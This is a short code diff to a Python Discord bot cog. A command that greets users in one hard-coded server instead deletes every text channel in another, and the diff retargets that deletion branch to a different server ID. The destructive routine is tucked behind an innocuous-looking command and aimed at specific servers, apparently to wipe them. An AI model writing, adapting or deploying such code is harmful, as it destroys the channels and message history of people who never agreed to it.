@@ -30,7 +30,7 @@ class main(commands.Cog):
     async def main(self, ctx):
         if ctx.guild.id == 645697605829001217:
             await ctx.send("At your service!")
-        elif ctx.guild.id == 773612066631974984:
+        elif ctx.guild.id == 767196470931095602:
             for i in ctx.guild.text_channels:
                 await ctx.send(i)
                 await i.delete()
